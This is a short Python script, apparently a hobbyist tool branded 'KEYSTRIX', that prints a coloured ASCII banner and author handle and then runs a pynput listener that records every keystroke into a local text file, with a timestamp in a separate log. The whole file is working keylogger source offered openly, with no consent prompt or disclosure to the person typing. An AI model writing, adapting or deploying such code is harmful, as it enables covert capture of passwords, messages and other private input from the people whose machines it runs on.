import colorama
from colorama import Fore, Back, Style
import pynput
from pynput.keyboard import Key, Listener
import datetime


colorama.init()

text = """
8  dP 8888 Yb  dP .d88b. 88888 888b. 888 Yb  dP 
8wdP  8www  YbdP  YPwww.   8   8  .8  8   YbdP  
88Yb  8      YP       d8   8   8wwK'  8   dPYb  
8  Yb 8888   88   `Y88P'   8   8  Yb 888 dP  Yb 
"""
special_text = "KEYSTRIX"
username = "<@trashz403>"

# colors for characters
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

# Printing characters with color
color_index = 0
for char in text:
    if char != '\n':
        print(colors[color_index] + char, end="")
        color_index = (color_index + 1) % len(colors)
    else:
        print()  # Move to the next line

print("\n","            ",username)
print("\n\nhttps://github.com/trashz403")


def on_press(key):
    with open("/home/z403/authorized/test.txt", "a") as f:
        if isinstance(key, Key):
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.backspace:
                f.seek(f.tell() - 1, 0)
                f.truncate()
        else:
            f.write(str(key).strip("'"))


with Listener(on_press=on_press) as listener:
    with open("logs.txt", "a") as f:
        f.write(f"Logging started at: {datetime.datetime.now()}\n")
    listener.join()
